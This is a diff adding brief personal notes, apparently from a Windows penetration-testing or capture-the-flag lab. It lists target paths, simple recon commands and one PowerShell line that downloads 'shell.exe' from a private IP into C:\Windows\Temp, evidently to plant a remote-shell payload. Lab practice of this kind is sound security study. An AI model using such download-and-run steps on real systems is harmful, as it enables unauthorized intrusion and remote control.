@@ -1,0 +1,14 @@
+c:\Program Files (x86)\SystemScheduler
+
+c:\Windows\Temp
+
+get file in cmd
+powershell -c "Invoke-WebRequest -Uri 'http://10.18.84.211:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
+
+
+os version cmd
+sysinfo
+
+
+whoami for cmd
+echo %username%
